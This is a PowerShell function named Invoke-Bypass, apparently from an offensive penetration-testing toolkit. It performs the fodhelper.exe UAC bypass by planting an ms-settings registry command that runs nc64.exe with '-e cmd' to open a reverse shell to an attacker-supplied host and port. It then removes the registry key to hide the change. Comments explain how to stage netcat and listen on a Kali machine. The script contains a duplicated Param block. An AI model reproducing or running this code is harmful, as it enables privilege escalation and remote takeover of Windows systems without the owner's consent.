function Invoke-Bypass(){ 

<# 
UAC Bypass if you belong to administrators group but if used for Deny Only, this can bypass that and 
allow for the user to have all privileges that are for an administrator, thus allowing them to run administrator
powershells, administrator level winpeas and more

Start python server on port 80 in your tools directory (where nc64.exe is located)
if you do not have all the tools, you can download shell script from following location
wget https://github.com/overgrowncarrot1/Invoke-Everything/blob/main/Windows-Tools.sh

If nc64.exe is not on target machine either download to C:\Temp or run Invoke-Tools, found here
https://github.com/overgrowncarrot1/Invoke-Everything/blob/main/Invoke-Tools.ps1

To run invoke-bypass -lhost <kali ip> -lport <listening port on kali machine>
make sure to start nc -lvnp <lport> on your kali machine

#>
[cmdletbinding()] Param(
    
     [Parameter(Position = 0, Mandatory = $true)]
     [string]
     $LHOST,
     [Parameter(Position = 1, Mandatory = $true)]
     [string]
     $LPORT,
     [Parameter(ParameterSetName="help")]
     [Switch]
     $help
)

Param (    
 
 [String]$program = "cmd /c C:\Temp\nc64.exe $LHOST $LPORT -e cmd"
 
      )
 
#Create registry structure
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force

 
#Perform the bypass
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 
#Remove registry structure
Start-Sleep 3
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
 
}
